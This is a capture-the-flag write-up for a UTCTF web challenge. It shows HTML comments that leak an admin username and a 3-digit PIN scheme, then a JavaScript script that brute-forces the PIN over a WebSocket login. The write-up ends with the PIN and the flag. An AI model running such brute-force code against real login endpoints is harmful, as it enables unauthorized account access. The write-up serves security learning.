#### Challenge:

Can you hack my website? `http://web1.utctf.live:8651`

---

#### Solution:

- inspecting the page reveals login page `http://web1.utctf.live:8651/internal/login` and `admin` username
```html
<!--
TODO: this button is set to the wrong URL and for some reason only the 'admin' account can change it. Tom is the only one who knows the passcode and he's out until Wednesday. I'm not paid enough to deal with this so it's just going to be broken for now. It's not like we get traffic anyway 😠 
-->
```
- inspecting `login` page then reveals that `admin` uses 3 digit pin that can be easily brute-forced
```html
<!--
what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can't remember jack 
-->
```

```js
async function brutePass() {
    for (let i = 0; i <= 9; i++) {
        for (let o = 0; o <= 9; o++) {
            for (let p = 0; p <= 9; p++) {
                if (await checkPassword0("admin", `${i}${o}${p}`)) {
                    return;
                }
            }
        }
    }
}

function checkPassword0(user, pass) {
    return new Promise(resolve => {
        const socket = new WebSocket("ws://web1.utctf.live:8651/internal/ws")
        socket.addEventListener('message', (event) => {
            if (event.data == "begin") {
                socket.send("begin");
                socket.send("user " + user)
                socket.send("pass " + pass)
                console.log("testing", user, pass);
            } else if (event.data == "baduser") {
                console.warn("Unknown user");
                socket.close()
                resolve(false);
            } else if (event.data == "badpass") {
                console.warn("Incorrect PIN");
                socket.close()
                resolve(false);
            } else if (event.data.startsWith("session ")) {
                document.cookie = "flask-session=" + event.data.replace("session ", "") + ";";
                socket.send("goodbye")
                socket.close()
                console.warn("Sucess", user, pass, document.cookie); // admin:907
                resolve(true);
            } else {
                console.warn("Unknown error");
                socket.close()
                resolve(false);
            }
        })
    })
}
```

---

<details><summary>FLAG:</summary>

```
utflag{w3bsock3ts}
```

</details>
<br/>
